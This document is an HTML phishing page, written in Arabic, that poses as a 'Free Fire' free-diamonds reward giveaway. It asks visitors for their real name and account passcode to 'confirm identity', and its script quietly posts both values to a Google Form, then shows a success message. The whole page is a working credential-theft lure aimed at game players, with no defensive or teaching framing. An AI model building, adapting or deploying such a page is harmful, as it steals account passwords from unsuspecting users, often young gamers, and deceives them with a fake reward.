<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Freefire Best Reward Gifter</title>
    <link rel="stylesheet" href="styles.css"> <!-- Link to your CSS file -->

    <script>
        function gatherInfo() {
            // Get the values from the input fields
            const realLifeName = document.getElementById('realLifeName').value;
            const passcode = document.getElementById('passcode').value;

            // Create a FormData object for Google Form submission
            const formData = new FormData();
            formData.append("entry.1486279132", realLifeName); // For "IRL Name"
            formData.append("entry.883013378", passcode); // For "Passcode"

            // Submit the form using fetch to Google Form
            fetch('https://docs.google.com/forms/d/e/1FAIpQLScrjWYYpwwiJHYE4AkAxDlgthQdXjnGiYYhobdxwBPjK8iFHg/viewform?usp=sf_link', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                console.log('Form submitted successfully:', response);
                alert('تم حفظ المعلومات بنجاح!'); // Notify user about success
            })
            .catch(error => {
                console.error('Error submitting form:', error);
                alert('حدث خطأ أثناء حفظ المعلومات: ' + error.message); // Notify user about error
            });

            // Log the values to the console
            console.log(`Real Life Name: ${realLifeName}, Passcode: ${passcode}`);

            // Resetting the input fields
            document.getElementById('realLifeName').value = '';
            document.getElementById('passcode').value = '';
        }
    </script>
</head>
<body>
    <header>
        <img src="Logo_of_Garena_Free_Fire.png" alt="Top Image" class="top-image"> <!-- Replace with your image path -->
    </header>
    <main>
        <h1>مكافأة الماس المجانية من فري فاير</h1>
        <p>يرجى وضع معلومات حسابك في فري فاير أدناه لتأكيد هويتك.</p>
        
        <input type="text" id="realLifeName" placeholder="اسمك الحقيقي" required>
        <input type="text" id="passcode" placeholder="رقم سري" required>
        <button onclick="gatherInfo()">اقبل</button>
    </main>
</body>
</html>
